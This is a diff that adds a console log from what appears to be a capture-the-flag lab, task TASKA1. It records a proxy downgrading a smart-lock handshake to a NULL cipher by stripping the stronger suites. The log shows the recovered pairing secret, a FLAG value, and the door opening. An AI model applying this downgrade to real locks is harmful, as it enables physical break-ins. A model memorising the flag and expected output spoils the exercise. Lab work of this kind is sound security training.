@@ -1,0 +1,35 @@
+====================================================
+[*] SmartLock v1 Negotiation Downgrade Exploit (TASKA1)
+[*] Target Lock Server: 10.10.10.11:9030
+[*] Proxy Listening on : 0.0.0.0:8000
+====================================================
+[+] Waiting for Hub connection on port 8000...
+[+] Hub connected! Connecting to Lock Server at 10.10.10.11:9030...
+[+] Connected to Lock Server! Intercepting handshake...
+
+[-] [ORIGINAL HUB HELLO]:
+    suites:AES256-GCM,AES128-GCM,NULL	type:HELLO
+[!] [TAMPERED FOR LOCK]:
+    suites:NULL	type:HELLO
+[-] [LOCK REPLY SUITE]:
+    suite:NULL	type:SUITE
+[-] [LOCK CERT (forwarding)]
+[-] [HUB PAIR (forwarding)]
+[-] [LOCK DH (forwarding)]
+[-] [HUB DHCLIENT (forwarding)]
+
+====================================================
+[+] [INTERCEPTED GREETING RECORD]:
+    ct:506169726564207769746820536d6172744c6f636b2e2050616972696e67207365637265743a20464c41477b633336303361623533343839373934307d	nonce:223b7032c9d5f666cd0974eb	type:MSG
+[+] [RECOVERED CLEARTEXT]: Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+
+>>> EXPLOIT SUCCESS: RECOVERED SECRET FLAG: FLAG{c3603ab534897940} <<<
+
+====================================================
+[+] Downgrade session cleanly closed.
+[hub] negotiated suite: NULL
+[hub] device claims to be: smartlock-23i-0614.local (certificate not checked)
+[lock] Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+[lock] STATE LOCKED unlocks=0
+[lock] DOOR OPENED (unlock #1)
+[lock] DOOR LOCKED
